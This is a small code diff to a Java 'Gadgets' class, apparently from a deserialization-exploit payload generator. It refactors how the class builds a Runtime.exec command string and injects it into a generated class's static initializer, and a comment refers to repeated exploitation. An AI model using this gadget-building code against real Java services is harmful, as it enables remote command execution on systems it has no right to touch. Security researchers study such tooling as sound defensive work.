@@ -26,6 +26,7 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 
+import org.apache.commons.lang3.StringUtils;
 import org.apache.commons.text.StringEscapeUtils;
 
 
@@ -121,7 +122,7 @@ public class Gadgets {
         for (String param : command) {
                escapedParams.add("\"" + StringEscapeUtils.escapeJava(param) + "\"");
         }
-        String cmd = "java.lang.Runtime.getRuntime().exec(new String[] {" + String.join(", ", escapedParams) + "});";
+        String cmd = "java.lang.Runtime.getRuntime().exec(new String[] {" + StringUtils.join(escapedParams, ", ") + "});";
 
         clazz.makeClassInitializer().insertAfter(cmd);
         // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
